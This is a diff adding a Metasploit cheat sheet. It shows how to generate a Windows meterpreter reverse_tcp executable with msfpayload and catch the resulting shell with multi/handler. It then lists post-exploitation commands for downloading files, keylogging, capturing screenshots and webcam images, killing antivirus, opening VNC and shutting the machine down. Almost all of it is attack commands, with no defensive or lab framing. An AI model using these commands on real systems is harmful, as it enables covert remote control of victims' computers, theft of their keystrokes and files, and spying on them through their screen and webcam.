@@ -1,0 +1,58 @@
+msfconsole   (An metasploit interface to get the console for metasploit as well to see the no. of availble exploits)
+
+msfpayload windows/meterpreter/reverse_tcp LHOST= [Your IP] LPORT=4321 x>/root/filename.exe   (To just create the payload, here msfpayload is a utility of metasploit.)
+
+use exploit/multi/handler  (To use "Handler" exploit or To use a particular exploit, In this case Handler. As soon you press this command, it will go inside this exploit and the console will look like "msf exploit(handler) > " )
+
+show options   (To show the options related to this exploit[handler] only. It shows the set LHOST,LPORT,RHOST etc alongwith description.)
+
+               (LPORT is used for mentioning your IP or listen address & LPORT is listen port, & RHOST is for target system IP address)
+
+set LHOST yourIP    (to set listen address)
+set LPORT 4321                (to set listen port)
+set Payload windows/meterpreter/reverse_tcp  (setting reverse_tcp)
+exploit    (to start listening)
+
+
+
+help(enter)  (To display the help menu and available commands)
+
+search windows(enter)   (To search for the available exploits in metasploit related to the windows)
+
+exit(enter)  (To exit the msfconsole and go back to the shell command prompt or to root)
+
+
+
+
+Post Exploitation Commands -:
+
+pwd
+ls
+cd G://
+edit filename.txt   (To Save - Press ESC,Then : ,Then wq and enter)
+download filename.extension
+
+keyscan_start
+keyscan_dump
+
+execute -f notepad.exe
+execute -f cmd.exe
+
+execute -f cmd.exe -i
+exit
+
+ps (To watch currently running programs)
+screenshot -p /root/AnyName.jpg
+screenshot -p /root/AnyName.jpg -v
+webcam_snap -i 1 -v false
+
+ipconfig (ip & MAC details)
+sysinfo
+
+run killav
+
+run webcam
+run vnc
+
+shutdown
+reboot
